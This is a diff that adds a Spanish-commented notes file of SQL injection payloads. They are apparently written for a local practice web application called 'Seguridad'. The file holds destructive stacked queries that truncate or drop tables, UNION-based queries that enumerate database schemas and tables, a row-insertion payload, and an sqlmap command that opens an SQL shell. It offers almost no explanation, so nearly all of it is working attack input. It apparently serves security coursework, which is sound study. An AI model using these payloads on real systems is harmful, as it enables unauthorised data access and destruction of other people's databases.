@@ -1,0 +1,61 @@
+//Bypass login 
+
+
+
+
+
+a' ;Truncate table PRODUCTO; -- 'dd
+a" ;Truncate table PRODUCTO; -- "dd
+
+select *from PRODUCTO where NOMBRE_P = 
+
+select schema_name as database_name
+from information_schema.schemata
+order by schema_name;
+
+sql_path,schema_name,catalog_name,default_collation_name
+
+select *from PRODUCTO UNION
+select sql_path,schema_name as db,catalog_name as aaa,default_collation_name
+from information_schema.schemata
+order by schema_name;
+
+
+
+
+
+
+//filtar esquemas 
+select *from PRODUCTO where NOMBRE_P = 'nombre'  union
+select null as a, null as b, null as c, schema_name
+from information_schema.schemata #'a'  
+
+//mostrar tablas 
+select *from PRODUCTO where NOMBRE_P = 'nombre' union
+SELECT null as a, null as b, null as c,table_name FROM information_schema.tables
+WHERE table_schema = 'Seguridad';
+
+
+//Borrar datos 
+truncate table 'PRODUCTO';
+A'; TRUNCATE TABLE PRODUCTO; SELECT *FROM information_schema.tables WHERE table_schema = 'Seguridad';  
+A'; DROP TABLE 'PRODUCTO
+
+//insertar datos 
+select *from PRODUCTO where NOMBRE_P = 'nombre'  union
+select null as a, null as b, null as c, schema_name
+from information_schema.schemata; insert into PRODUCTO VALUES(NULL,NULL,NULL,NULL) #'a'  
+
+
+
+
+
+
+select *from PRODUCTO where NOMBRE_P = 'nombre' 
+
+sqlmap -u "https://localhost/Seguridad/busqueda.php?input_busqueda=nombre" SEGURIDAD  --sql-shell
+
+
+
+
+a'; DROP TABLE USUARIOS; SELECT * FROM PRODUCTO WHERE nombre_p LIKE ‘%
